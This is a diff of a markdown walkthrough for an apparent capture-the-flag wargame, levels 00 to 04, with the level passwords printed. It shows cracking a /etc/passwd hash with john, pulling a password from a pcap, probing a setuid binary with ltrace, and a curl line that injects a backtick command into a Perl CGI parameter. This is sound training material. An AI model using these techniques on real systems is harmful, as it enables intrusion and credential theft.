@@ -22,6 +22,13 @@ $ ssh level00@$(ifconfig | grep 'inet ' | awk 'NR==2 {print $2}') -p 4242
 
 # 00
 
+Login
+
+```b
+> ssh level00@$(ifconfig|grep 'inet '|awk 'NR==2 {print $2}') -p 4242
+> Password: level00
+```
+
 Ideas
 
 - `ls` `pwd`
@@ -29,7 +36,8 @@ Ideas
 - `id` `whoami` `id flag00`
   - we are level00 
   - another user flag00 has different permissions
-- Let's compare their privileges:
+
+Let's compare privileges btw level00 and flag00:
 
 ```b
 > grep level00 /etc/passwd
@@ -43,8 +51,7 @@ total 0
 ls: cannot open directory /home/flag/flag00: Permission denied
 ```
 
-- `level00` has an empty Home directory
-- Let's check if we have other files outside of Home
+Let's check if we have other files outside of Home
 
 ```b
 > ls -l
@@ -64,7 +71,7 @@ cdiiddwpgswtgt
 - `+` : forces `find` to run `cat` on many files at once 
 
 
-Decipher ___`cdiiddwpgswtgt`___ in python
+Decipher _`cdiiddwpgswtgt`_ in python
 
 ```py
 a = ord('a')
@@ -76,18 +83,28 @@ for i in range(26):
 
 # 01
 
-- Legacy folder `/etc/passwd`
+Login
 
 ```b
-> cat /etc/passwd
-> cat /etc/passwd | grep -i flag01 | awk -F: '{print $2}'
+> ssh level01@$(ifconfig|grep 'inet '|awk 'NR==2 {print $2}') -p 4242
+> Password: x24ti5gi3x0ol2eh4esiuxias
+```
+
+Look at `/etc/passwd`
+
+```b
+> grep -i flag01 /etc/passwd
+flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash
+> grep flag01 /etc/passwd | awk -F: '{print $2}'
+42hDRfypTqqnw
 
 ### observation
-  😀 if we have john we'll able to do:
+  if we have john as a cli tool we'll able to one of these:
+  > john --show <(grep flag01 /etc/passwd | awk -F: '{print $2}')  
   > john --show <(cat /etc/passwd | grep -i flag01 | awk -F: '{print $2}')
 ```
 
-- Use `john`
+Download and use `john`
 
 ```b
 > wget https://download.openwall.net/pub/projects/john/contrib/macosx/john-1.8.0.9-jumbo-macosx_sse4.zip
@@ -102,24 +119,22 @@ OR
 > ./do_john.sh
 ```
 
-- token
-
-```b
-> su flag01
-Password: abcdefg
-> su level02
-> Password: f2av5il02puano7naaf6adaaf
-```
-
 
 # 02
 
-- New stuff
-  - `realpath` - get the full absolute filepath
-  - `scp` - secure copy - `scp username@ip:path _local_`
-  - `~.pcap` - a Packet Capture to store network packet data captured during network traffic monitoring
+Login
 
-- Save the `.pcap` to Host
+```b
+> ssh level02@$(ifconfig|grep 'inet '|awk 'NR==2 {print $2}') -p 4242
+> Password: f2av5il02puano7naaf6adaaf
+```
+
+New stuff
+- `realpath` - get the full absolute filepath
+- `scp` - secure copy - `scp username@ip:path _local_`
+- `~.pcap` - a Packet Capture to store network packet data captured during network traffic monitoring
+
+Save the `.pcap` to Host
 ```b
 ### VM
 > ls -l
@@ -129,7 +144,7 @@ Password: abcdefg
 > scp -P 4242 level02@$(ifconfig|grep 'inet '|awk 'NR==2 {print $2}'):/home/user/level02/level02.pcap $(pwd)
 ```
 
-- ❌ Inspect `.pcap`  
+❌ Inspect `.pcap`  
 
 ```b
 ### Host
@@ -139,9 +154,9 @@ Password: abcdefg
 > xxd level02.pcap | cut -d ' ' -f2-9 | tr -d ' '
 ```
 
-- ✅ Use _Wireshark_ 
-  - _Analyze - Follow - TCP Stream_ 
-  - copy _`TCP Stream`_ to text
+✅ Use _Wireshark_ 
+- _Analyze - Follow - TCP Stream_ 
+- copy _`TCP Stream`_ to text
 
 ```b
     000000D6  00 0d 0a 50 61 73 73 77  6f 72 64 3a 20            ...Passw ord: 
@@ -171,6 +186,8 @@ Password: abcdefg
 - `7f` - DE
 - `0d` - CR
 
+Parse the above block
+
 ```py
 infile = [[n[-2], n[-1]] for n in [_.split() for _ in open(0).read().split('\n') if len(_.split()) == 3]]
 res = ''
@@ -188,21 +205,20 @@ print('res/', res)
 # ft_waNDReL0L
 ```
 
-- token
-
-```b
-> su flag02
-Password: ft_waNDReL0L
-> su level03
-> Password: kooda2puivaav1idi4f57q8iq
-```
-
 
 # 03
 
-- Inspect
-  - ❌ `file` `readelf` `strings` 
-  - ✅ `ltrace` 
+Login
+
+```b
+> ssh level03@$(ifconfig|grep 'inet '|awk 'NR==2 {print $2}') -p 4242
+> Password: kooda2puivaav1idi4f57q8iq
+```
+
+Inspect
+- ❌ `file` `readelf` `strings` 
+- ✅ `ltrace` 
+
 ```
 > ls -l
 -rwsr-sr-x 1 flag03 level03 8627 level03
@@ -265,30 +281,48 @@ getflag: /bin/getflag
 > ./level03
 ```
 
-- Token
+
+# 04 
+
+Login
 
 ```b
-> su level04
+> ssh level04@$(ifconfig|grep 'inet '|awk 'NR==2 {print $2}') -p 4242
 > Password: qi0maab88jeaj46qoumi7maus
 ```
 
+We have a script and maybe it interacts w/ a webpage:
 
-# 04 - Todo: perl script problem
-- understand the `.pl`
-- know `2>&1`
+```pl
+#!/usr/bin/perl
+# localhost:4747
+use CGI qw{param};
+  # CGI (Common Gateway Interface)
+  # param: a CGI module func fetches params from HTTP requests
+  # qw: quote words
+print "Content-type: text/html\n\n";
+sub x {
+  $y = $_[0];
+  print `echo $y 2>&1`;
+  # sub -- define subroutine x
+  # $_[0] -- subroutine `x()` takes a single arg`
+  # print w/ backticks invokes a shell command
+  # 2>&1 -- combine stdout and stderr, & means 1 is a fd not a filename
+}
+x(param("x"));
+  # 1st `x` : calling the subroutine
+  # 2nd `x` : a query param
+  # x comes in form of "...?x=getflag"
+```
+
+Solution
+
 ```b
 > nc -vz localhost 4747
-  👆 v: verbose - z: scan if a port is open
+      ^ v: verbose, z: scan if a port is open (scanning listening daemons)
 Connection to localhost 4747 port [tcp/*] succeeded!
 
 > curl localhost:4747/?x="\`/bin/getflag\`"
-```
-
-- token
-
-```b
-su level05
-> Password: ne2searoevaevoem4ov4ar8ap
 ```
 
 
